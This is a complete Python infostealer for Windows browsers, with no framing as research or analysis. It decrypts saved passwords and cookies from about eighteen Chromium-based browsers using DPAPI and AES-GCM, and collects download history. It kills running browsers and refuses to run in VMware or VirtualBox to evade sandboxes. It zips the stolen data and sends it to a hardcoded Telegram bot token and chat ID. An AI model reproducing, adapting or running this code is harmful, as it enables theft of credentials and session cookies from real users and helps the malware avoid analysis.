
import os
import json
import base64
import sqlite3
import shutil
import zipfile
import requests
import time
import subprocess
import wmi
from datetime import datetime
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData
import psutil

appdata = os.getenv('LOCALAPPDATA')
script_dir = os.path.dirname(os.path.realpath(__file__))
tempdir = os.path.join(script_dir, 'temp')

browsers = {
    'avast': 'AVAST Software\\Browser\\User Data',
    'amigo': 'Amigo\\User Data',
    'torch': 'Torch\\User Data',
    'kometa': 'Kometa\\User Data',
    'orbitum': 'Orbitum\\User Data',
    'cent-browser': 'CentBrowser\\User Data',
    '7star': '7Star\\7Star\\User Data',
    'sputnik': 'Sputnik\\Sputnik\\User Data',
    'vivaldi': 'Vivaldi\\User Data',
    'google-chrome-sxs': 'Google\\Chrome SxS\\User Data',
    'google-chrome': 'Google\\Chrome\\User Data',
    'epic-privacy-browser': 'Epic Privacy Browser\\User Data',
    'microsoft-edge': 'Microsoft\\Edge\\User Data',
    'uran': 'uCozMedia\\Uran\\User Data',
    'yandex': 'Yandex\\YandexBrowser\\User Data',
    'brave': 'BraveSoftware\\Brave-Browser\\User Data',
    'iridium': 'Iridium\\User Data',
    'coc-coc': 'CocCoc\\Browser\\User Data'
}

data_queries = {
    'login_data': {
        'query': 'SELECT origin_url, action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['Origin URL', 'Action URL', 'Username', 'Password'],
        'decrypt': True
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['URL', 'Path'],
        'decrypt': False
    }
}

def get_master_key(path):
    try:
        if not os.path.exists(path):
            return None
        
        with open(os.path.join(path, 'Local State'), "r", encoding="utf-8") as f:
            local_state = json.load(f)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        key = CryptUnprotectData(key, None, None, None, 0)[1]
        return key
    except Exception as e:
        print(f"Error getting master key: {e}")
        return None

def decrypt_password(buff, key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        print(f"Error decrypting password: {e}")
        return ""

def save_results(browser_name, profile, data_type, content):
    try:
        if content is None:
            return
        
        profile_dir = os.path.join(tempdir, browser_name, profile)
        os.makedirs(profile_dir, exist_ok=True)
        file_path = os.path.join(profile_dir, f"{data_type}.txt")

        mode = 'a' if os.path.exists(file_path) else 'w'
        with open(file_path, mode, encoding="utf-8") as file:
            if mode == 'a':
                existing_content = file.read()
                if content not in existing_content:
                    file.write(content)
            else:
                file.write(content)
    except Exception as e:
        print(f"Error saving results: {e}")

def get_data(path, profile, key, data_type):
    try:
        db_file = os.path.join(path, f"{profile}{data_type['file']}")
        if not os.path.exists(db_file):
            return None

        result = ""
        shutil.copy(db_file, 'temp_db')
        conn = sqlite3.connect('temp_db')
        cursor = conn.cursor()
        cursor.execute(data_type['query'])

        for row in cursor.fetchall():
            row = list(row)
            if data_type['decrypt']:
                row = [decrypt_password(col, key) if isinstance(col, bytes) else col for col in row]

            result += "\n".join([f"{col}: {val}" for col, val in zip(data_type['columns'], row)]) + "\n\n"

        conn.close()
        os.remove('temp_db')
        return result
    except Exception as e:
        print(f"Error getting data: {e}")
        return None

def installed_browsers():
    try:
        return [browser for browser, path in browsers.items() if os.path.exists(os.path.join(appdata, path))]
    except Exception as e:
        print(f"Error checking installed browsers: {e}")
        return []

def get_profile_cookies(browser, profile):
    try:
        cookies_file = os.path.join(appdata, browsers[browser], profile, 'Network', 'Cookies')
        if not os.path.exists(cookies_file):
            return None

        conn = sqlite3.connect(cookies_file)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        cookies = cursor.fetchall()
        conn.close()

        return cookies
    except Exception as e:
        print(f"Error getting cookies: {e}")
        return None

def extract_cookies(cookies, master_key):
    try:
        cookie_list = []
        for host_key, name, encrypted_value in cookies:
            try:
                if encrypted_value[:3] == b'v10':
                    decrypted_value = decrypt_password(encrypted_value, master_key)
                else:
                    decrypted_value = CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
                cookie_list.append((host_key, name, decrypted_value))
            except Exception as e:
                print(f"Error decrypting cookie {name} for {host_key}: {e}")
        return cookie_list
    except Exception as e:
        print(f"Error extracting cookies: {e}")
        return []

def save_cookies(browser, profile, cookies):
    try:
        profile_dir = os.path.join(tempdir, browser, profile)
        os.makedirs(profile_dir, exist_ok=True)
        file_path = os.path.join(profile_dir, 'cookies.txt')

        with open(file_path, 'w', encoding="utf-8") as file:
            for host_key, name, value in cookies:
                file.write(f"{host_key}\tTrue\t/\tTrue\t0\t{name}\t{value}\n")
    except Exception as e:
        print(f"Error saving cookies: {e}")

def get_machine_info():
    try:
        machine_name = os.getenv('COMPUTERNAME')
        public_ip = requests.get('https://ipinfo.io/ip').text.strip()
        response = requests.get(f'https://ipinfo.io/{public_ip}/json')
        data = response.json()
        country = data.get('country', 'Unknown')

        return machine_name, country
    except Exception as e:
        print(f"Error retrieving machine info: {e}")
        return None, None

def zip_data_and_send():
    try:
        machine_name, country = get_machine_info()
        current_time = datetime.now().strftime("%H-%M-%S")

        zip_filename = f"{machine_name}.zip"
        zip_filepath = os.path.join(script_dir, zip_filename)

        with zipfile.ZipFile(zip_filepath, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(tempdir):
                for file in files:
                    file_path = os.path.join(root, file)
                    zipf.write(file_path, os.path.relpath(file_path, tempdir))

        zipf.close()

        telegram_bot_token = '7329846364:AAGwF5GnidfMbm7g-PrqDPKetS_SLSv0A_g'
        telegram_chat_id = '-4203171732'
        url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'

        files = {'document': open(zip_filepath, 'rb')}
        params = {
            'chat_id': telegram_chat_id,
            'caption': f"Country: {country}\nTime: {current_time}"
        }

        response = requests.post(url, files=files, params=params)
        files['document'].close()

        if response.status_code == 200:
            os.remove(zip_filepath)

        shutil.rmtree(tempdir)

        return True
    except Exception as e:
        print(f"Error zipping data and sending: {e}")
        return False

def kill_browsers():
    try:
        browser_processes = ['chrome.exe', 'firefox.exe', 'msedge.exe', 'opera.exe', 'browser.exe']
        
        for process in psutil.process_iter(['name']):
            if process.info['name'] in browser_processes:
                process.kill()
                time.sleep(2)
    except Exception as e:
        print(f"Error killing browsers: {e}")

def detect_virtual_machine():
    try:
        c = wmi.WMI()
        for os in c.Win32_OperatingSystem():
            if "VMWare" in os.Caption or "VirtualBox" in os.Caption:
                return True
            if "VMware" in os.Manufacturer or "innotek GmbH" in os.Manufacturer:
                return True
        return False
    except Exception as e:
        print(f"Error detecting virtual machine: {e}")
        return False

if __name__ == '__main__':
    try:
        kill_browsers()
        if not os.path.exists(tempdir):
            os.makedirs(tempdir)

        if detect_virtual_machine():
            print("This program cannot run in a virtual machine.")
            exit()

        available_browsers = installed_browsers()

        for browser in available_browsers:
            browser_path = os.path.join(appdata, browsers[browser])
            master_key = get_master_key(browser_path)

            profiles = ['Default'] + [f'Profile {i}' for i in range(1, 200)]

            for profile in profiles:
                cookies = get_profile_cookies(browser, profile)
                if cookies:
                    decrypted_cookies = extract_cookies(cookies, master_key)
                    save_cookies(browser, profile, decrypted_cookies)

                for data_type_name, data_type in data_queries.items():
                    data = get_data(browser_path, profile, master_key, data_type)
                    save_results(browser, profile, data_type_name, data)

        zip_data_and_send()
    except Exception as e:
        print(f"Unhandled exception in main: {e}")
